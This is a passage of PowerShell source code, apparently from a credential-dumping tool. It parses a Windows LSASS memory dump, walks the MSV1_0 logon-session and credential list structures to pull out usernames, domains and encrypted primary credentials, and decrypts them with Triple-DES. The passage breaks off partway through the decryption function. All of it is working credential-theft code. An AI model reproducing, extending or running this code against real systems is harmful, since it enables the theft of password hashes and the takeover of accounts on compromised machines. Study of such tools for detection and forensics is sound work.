    function Get-DecCreds
        {
        Param(
            $DESKey,
            $IV,
            $EncString
        )
        
    
    
        $ByteDESKey = Get-BytesFromHex -String $DESKey
        $ByteIV = Get-BytesFromHex -String $IV
        $ByteData = Get-BytesFromHex -String $EncString
        $MyBuffer = [System.Byte[]]::new($ByteData.Length)
    
        $MemoryStreamDecrypt = [System.IO.MemoryStream]::new($ByteData)
        $MemoryStreamDecrypt.Position = 0
        $DESServiceProvider = [System.Security.Cryptography.TripleDESCryptoServiceProvider]::new()
        $DESServiceProvider.Key = $ByteDESKey
        $DESServiceProvider.Padding = "None"
        $DESServiceProvider.IV = $ByteIV[0..7]
        $Decrypt = $DESServiceProvider.CreateDecryptor($ByteDESKey,$ByteIV[0..7])
        $CryptoStream = [System.Security.Cryptography.CryptoStream]::new($MemoryStreamDecrypt,$Decrypt,[System.Security.Cryptography.CryptoStreamMode]::Read)
        $CryptoStream.Read($MyBuffer, 0, $MyBuffer.Length) | Out-Null
        $DecryptedString =  ([System.BitConverter]::ToString($MyBuffer)).replace('-','')
        
        return $DecryptedString
        }
    
    function Get-MSV1_0_LIST_63
        {
        Param(
            [int64]$InitialPosition,
            $StartAddress,
            $DESKey,
            $IV,
            $Dump,
            $CredentialParsingFunction, 
            $PathToDMP
        )
        $MSV1_0_LIST_63 = New-Object -Type psobject -Property (@{
                "flink" = $null
                "blink" = $null
                "unk0" = $null
                "unk1" = $null
                "unk2" = $null
                "unk3" = $null
                "unk4" = $null
                "unk5" = $null
                "hSemaphore6" = $null
                "unk7" = $null
                "hSemaphore8" = $null
                "unk9" = $null
                "unk10" = $null
                "unk11" = $null
                "unk12" = $null
                "unk13" = $null
                "LocallyUniqueIdentifier" = $null
                "SecondaryLocallyUniqueIdentifier" = $null
                "username" = $null
                "Domaine" = $null
                "unk14" = $null
                "Type" = $null
                "PSID" = $null
                "LogonType" = $null
                "unk18" = $null
                "logontime" = $null
                "LogonServer" = $null
                "CredentialListPt" = $null
                "MSV1_0_CREDENTIAL_LIST" = $null
                "unk19" = $null
                "unk20" = $null
                "unk21" = $null
                "unk22" = $null
                "unk23" = $null
                "unk24" = $null
                "unk25" = $null
                "unk26" = $null
                "unk27" = $null
                "unk28" = $null
                "unk29" = $null
                "CredentialManager" = $null
                })
    
        $username = New-Object -Type psobject -Property (@{
                    "Position" = $Null
                    "Length" =  $null
                    "MaxLength" = $null 
                    "Buffer" = $null
                    })
    
        $Domain = New-Object -Type psobject -Property (@{
                    "Position" = $Null
                    "Length" =  $null 
                    "MaxLength" = $null 
                    "Buffer" = $null 
                    })
    
        $Type = New-Object -Type psobject -Property (@{
                    "Position" = $Null
                    "Length" =  $null
                    "MaxLength" = $null
                    "Buffer" = $null
                    })
    
        $LogonServer = New-Object -Type psobject -Property (@{
                    "Position" = $Null
                    "Length" =  $null 
                    "MaxLength" = $null 
                    "Buffer" = $null 
                    })
    
        $PSID = $null
    
        $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
        $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
        $fileReader.BaseStream.Seek($InitialPosition,[System.IO.SeekOrigin]::Begin) | Out-Null
        $flink = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
    
        $blink = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
    
        $unk0 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
    
        $unk1 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump))
     
        $unk2 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
        $unk3 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        $unk4 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        $unk5 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump))
     
        $hSemaphore6 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
        
        $unk7 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') 
        
        $hSemaphore8 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
        
        $unk9 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') 
        
        $unk10 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
        
        $unk11 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') 
        
        $unk12 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        
        $unk13 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
        
        $LocallyUniqueIdentifier = Get-LUID ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
        
        $SecondaryLocallyUniqueIdentifier = Get-LUID ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+12)
    
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
        $username.Position = $fileReader.BaseStream.Position
        $username.Length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
        $username.MaxLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
        $username.Buffer = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
        $Domain.Position = $fileReader.BaseStream.Position
        $Domain.Length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
        $Domain.MaxLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
        $Domain.Buffer = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk14 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk15 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $Type.Position = $fileReader.BaseStream.Position
        $Type.Length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
        $Type.MaxLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
    
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
        $Type.Buffer = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
        $PSID = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
        $LogonType = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
        $unk18 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $session = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
         
        $logontime = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
        $LogonServer.Position = $fileReader.BaseStream.Position
        $LogonServer.Length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
    
        $LogonServer.MaxLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
    
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
          
        $LogonServer.Buffer = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $CredentialListPtr = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        if($CredentialListPtr -eq "0000000000000000")
            {
            $MSV1_0_CREDENTIAL_LIST = "N/A"
            }
        else
            {
    
            $MSV1_0_CREDENTIAL_LIST = Get-MSV1_0_CREDENTIAL_LIST -InitialPosition (Get-MemoryAddress -MemoryAddress $CredentialListPtr -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP).position -StartAddress $CredentialListPtr -DESKey $DESKey -IV $IV -Dump $Dump -PathToDMP $PathToDMP -CredentialParsingFunction $CredentialParsingFunction
    
            }
        
        $unk19 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk20 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk21 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk22 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $unk23 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $unk24 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $unk25 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $unk26 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
        $unk27 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk28 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk29 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $CredentialManager = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
            $MSV1_0_LIST_63 = New-Object -Type psobject -Property (@{
                "flink" = $flink
                "blink" = $blink
                "unk0" = $unk0
                "unk1" = $unk1
                "unk2" = $unk2
                "unk3" = $unk3
                "unk4" = $unk4
                "unk5" = $unk5
                "hSemaphore6" = $hSemaphore6
                "unk7" = $unk7
                "hSemaphore8" = $hSemaphore8
                "unk9" = $unk9
                "unk10" = $unk10
                "unk11" = $unk11
                "unk12" = $unk12
                "unk13" = $unk13
                "LocallyUniqueIdentifier" = $LocallyUniqueIdentifier
                "SecondaryLocallyUniqueIdentifier" = $SecondaryLocallyUniqueIdentifier
                "username" = $username
                "Domain" = $Domain
                "unk14" = $unk14
                "Type" = $Type
                "PSID" = $PSID
                "LogonType" = $LogonType
                "unk18" = $unk18
                "logontime" = $logontime
                "LogonServer" = $LogonServer
                "CredentialListPt" = $CredentialListPt
                "MSV1_0_CREDENTIAL_LIST" = $MSV1_0_CREDENTIAL_LIST
                "unk19" = $unk19
                "unk20" = $unk20
                "unk21" = $unk21
                "unk22" = $unk22
                "unk23" = $unk23
                "unk24" = $unk24
                "unk25" = $unk25
                "unk26" = $unk26
                "unk27" = $unk27
                "unk28" = $unk28
                "unk29" = $unk29
                "CredentialManager" = $CredentialManager
                })
            return  $MSV1_0_LIST_63
        }
    
    function Get-MSV1_0_LIST_62
        {
        Param(
            [int64]$InitialPosition,
            $StartAddress,
            $DESKey,
            $IV,
            $PathToCDP,
            $CredentialParsingFunction, 
            $PathToDMP
        )
    
        $BytesAdded = 0
    
        $MSV1_0_LIST_62 = New-Object -Type psobject -Property (@{
                "flink" = $null
                "blink" = $null
                "unk0" = $null
                "unk1" = $null
                "unk2" = $null
                "unk3" = $null
                "unk4" = $null
                "unk5" = $null
                "hSemaphore6" = $null
                "unk7" = $null
                "hSemaphore8" = $null
                "unk9" = $null
                "unk10" = $null
                "unk11" = $null
                "unk12" = $null
                "unk13" = $null
                "LocallyUniqueIdentifier" = $null
                "SecondaryLocallyUniqueIdentifier" = $null
                "username" = $null
                "Domain" = $null
                "unk14" = $null
                "Type" = $null
                "PSID" = $null
                "LogonType" = $null
                "unk18" = $null
                "logontime" = $null
                "LogonServer" = $null
                "CredentialListPt" = $null
                "MSV1_0_CREDENTIAL_LIST" = $null
                "unk19" = $null
                "unk20" = $null
                "unk21" = $null
                "unk22" = $null
                "unk23" = $null
                "unk24" = $null
                "unk25" = $null
                "unk26" = $null
                "unk27" = $null
                "unk28" = $null
                "unk29" = $null
                "CredentialManager" = $null
                })
        
    
        $username = New-Object -Type psobject -Property (@{
                    "Position" = $Null
                    "Length" =  $null # 2 Bytes
                    "MaxLength" = $null # 2 Bytes
                    "Buffer" = $null # 8 Bytes
                    })
    
        $Domain = New-Object -Type psobject -Property (@{
                    "Position" = $Null
                    "Length" =  $null # 2 Bytes
                    "MaxLength" = $null # 2 Bytes
                    "Buffer" = $null # 8 Bytes
                    })
    
        $Type = New-Object -Type psobject -Property (@{
                    "Position" = $Null
                    "Length" =  $null # 2 Bytes
                    "MaxLength" = $null # 2 Bytes
                    "Buffer" = $null # 8 Bytes
                    })
    
        $LogonServer = New-Object -Type psobject -Property (@{
                    "Position" = $Null
                    "Length" =  $null # 2 Bytes
                    "MaxLength" = $null # 2 Bytes
                    "Buffer" = $null # 8 Bytes
                    })
    
        $PSID = $null
    
        $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
        $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
        $fileReader.BaseStream.Seek($InitialPosition,[System.IO.SeekOrigin]::Begin) | Out-Null
    
        $flink = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
        
        $blink = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk0 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk1 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
     
        $unk2 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk3 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        $unk4 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $unk5 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
     
        $hSemaphore6 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk7 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $hSemaphore8 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk9 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk10 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk11 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $unk12 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $unk13 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $LocallyUniqueIdentifier = Get-LUID ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $SecondaryLocallyUniqueIdentifier = Get-LUID ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $username.Position = $fileReader.BaseStream.Position
        $username.Length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
    
        $username.MaxLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
    
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
     
        $username.Buffer = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $Domain.Position = $fileReader.BaseStream.Position
        $Domain.Length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
    
        $Domain.MaxLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
    
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
     
        $Domain.Buffer = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk14 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk15 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $Type.Position = $fileReader.BaseStream.Position
        $Type.Length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
    
        $Type.MaxLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
    
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
     
        $Type.Buffer = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $PSID = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $LogonType = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
     
        $unk18 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $session = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
     
        $logontime = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
    
        $LogonServer.Position = $fileReader.BaseStream.Position
        $LogonServer.Length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
    
    
        $LogonServer.MaxLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
    
    
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
     
        $LogonServer.Buffer = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        
        $CredentialListPtr = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
        if($CredentialListPtr -eq "0000000000000000")
            {
            $MSV1_0_CREDENTIAL_LIST = "N/A"
            }
        else
            {
            $MSV1_0_CREDENTIAL_LIST = Get-MSV1_0_CREDENTIAL_LIST -InitialPosition (Get-MemoryAddress -MemoryAddress $CredentialListPtr -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP).position -StartAddress $CredentialListPtr -DESKey $DESKey -IV $IV -Dump $Dump -PathToDMP $PathToDMP -CredentialParsingFunction $CredentialParsingFunction}
    
    
        $unk19 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk20 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk21 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk22 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $unk23 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $unk24 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $unk25 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $unk26 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
     
        $unk27 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk28 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $unk29 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $CredentialManager = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $MSV1_0_LIST_62 = New-Object -Type psobject -Property (@{
            "flink" = $flink
            "blink" = $blink
            "unk0" = $unk0
            "unk1" = $unk1
            "unk2" = $unk2
            "unk3" = $unk3
            "unk4" = $unk4
            "unk5" = $unk5
            "hSemaphore6" = $hSemaphore6
            "unk7" = $unk7
            "hSemaphore8" = $hSemaphore8
            "unk9" = $unk9
            "unk10" = $unk10
            "unk11" = $unk11
            "unk12" = $unk12
            "unk13" = $unk13
            "LocallyUniqueIdentifier" = $LocallyUniqueIdentifier
            "SecondaryLocallyUniqueIdentifier" = $SecondaryLocallyUniqueIdentifier
            "username" = $username
            "Domain" = $Domain
            "unk14" = $unk14
            "Type" = $Type
            "PSID" = $PSID
            "LogonType" = $LogonType
            "unk18" = $unk18
            "logontime" = $logontime
            "LogonServer" = $LogonServer
            "CredentialListPt" = $CredentialListPt
            "MSV1_0_CREDENTIAL_LIST" = $MSV1_0_CREDENTIAL_LIST
            "unk19" = $unk19
            "unk20" = $unk20
            "unk21" = $unk21
            "unk22" = $unk22
            "unk23" = $unk23
            "unk24" = $unk24
            "unk25" = $unk25
            "unk26" = $unk26
            "unk27" = $unk27
            "unk28" = $unk28
            "unk29" = $unk29
            "CredentialManager" = $CredentialManager
            })
        
        return  $MSV1_0_LIST_62
        }
    
    function Get-MSV1_0_CREDENTIAL_LIST
        {
        Param(
            $InitialPosition,
            $StartAddress,
            $DESKey,
            $IV,
            $CredentialParsingFunction,
            $Dump,
            
            $PathToDMP
        )
    
        $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
        $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
    
        $MSV1_0_CREDENTIAL_LIST = New-Object -Type psobject -Property (@{
                "flink" = $null
                "AuthenticationPackageId"=$null
                "PrimaryCredentials_ptr"= $null
                "PrimaryCredentials_data" =$null
                })
    
        $fileReader.BaseStream.Position=$InitialPosition
        $flink = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
        $AuthenticationPackageId = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null  
    
        $PrimaryCredentials_ptr = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
        $PrimaryCredentials_data = Get-MSV1_0_PRIMARY_CREDENTIAL_ENC -InitialPosition (Get-MemoryAddress -MemoryAddress $PrimaryCredentials_ptr -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP).position -StartAddress $PrimaryCredentials_ptr -DESKey $DESKey -IV $IV -Dump $Dump -PathToDMP $PathToDMP -CredentialParsingFunction $CredentialParsingFunction
    
        $MSV1_0_CREDENTIAL_LIST = New-Object -Type psobject -Property (@{
                "flink" = $flink
                "AuthenticationPackageId"=$AuthenticationPackageId
                "PrimaryCredentials_ptr"= $PrimaryCredentials_ptr
                "PrimaryCredentials_data" = $PrimaryCredentials_data
                })
    
        return $MSV1_0_CREDENTIAL_LIST
        }
    
    function Get-MSV1_0_PRIMARY_CREDENTIAL_ENC
        {
        Param(
        $InitialPosition,
        $StartAddress,
        $DESKey,
        $IV,
        $Dump,
        $CredentialParsingFunction,
        $PathToDMP
        )
    
        $MSV1_0_PRIMARY_CREDENTIAL_ENC = New-Object -Type psobject -Property (@{
                "flink" = $null
                "Primary" = $null
                "encrypted_data" = $null
                "decrypted_data" = $null
                })
    
    
        $Primary = New-Object -Type psobject -Property (@{
                 "Position" = $Null
                 "Length" =  $null
                 "MaxLength" = $null
                 "Buffer" = $null
                 })
    
        $encrypted_data = New-Object -Type psobject -Property (@{
                 "Position" = $Null
                 "Length" =  $null
                 "MaxLength" = $null
                 "Buffer" = $null
                 "data" = $null
                 })
    
        $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
        $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
    
        $fileReader.BaseStream.Position=$InitialPosition
        $flink = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
        $Primary.Position = $fileReader.BaseStream.Position
        $Primary.Length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
        $Primary.MaxLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
        $Primary.Buffer =  Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')     
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null       
        $encrypted_data.Position = $fileReader.BaseStream.Position
        $encrypted_data.Length = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
        $encrypted_data.MaxLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null
        $encrypted_data.Buffer = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') 
        $encrypted_data.data = (Get-MemoryAddress -MemoryAddress $encrypted_data.Buffer -MemoryRanges64 $Dump.Memory64ListStream -SizeToRead ([convert]::toint64($encrypted_data.Length,16)) -PathToDMP $PathToDMP).data
       
        [string]$DecryptedCredsStr = Get-DecCreds -DESKey $DESKey -IV $IV -EncString $encrypted_data.data 
